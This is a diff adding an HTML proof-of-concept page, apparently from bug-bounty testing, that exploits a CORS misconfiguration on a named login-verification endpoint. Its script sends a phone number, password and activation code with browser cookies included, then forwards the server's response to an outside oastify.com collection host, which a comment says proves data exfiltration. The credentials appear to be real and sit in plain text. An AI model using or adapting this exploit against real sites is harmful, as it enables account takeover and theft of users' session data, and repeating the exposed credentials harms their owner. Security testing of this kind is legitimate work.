@@ -1,0 +1,35 @@
+<!doctype html>
+<html>
+<body>
+<h1>CORS PoC</h1>
+<pre id="out"></pre>
+<script>
+const data = {
+  cellNumber: "09233950961",
+  password: "Ali138296",
+  activationCode: "36093"
+};
+
+fetch("https://app.karafariniomid.com/security/token/neo/login/verify", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  credentials: "include", // اگر کوکی سشن باشد هم ارسال می‌شود
+  body: JSON.stringify(data)
+})
+  .then(r => r.text())
+  .then(t => {
+    document.getElementById("out").textContent = t;
+
+    // ارسال جواب به سرور oastify (برای اثبات data exfiltration)
+    fetch("https://xopgfirufpzdjgxwswb64um78yep2gq5.oastify.com/log", {
+      method: "POST",
+      mode: "no-cors",
+      body: t
+    });
+  })
+  .catch(e => {
+    document.getElementById("out").textContent = "Error: " + e;
+  });
+</script>
+</body>
+</html>
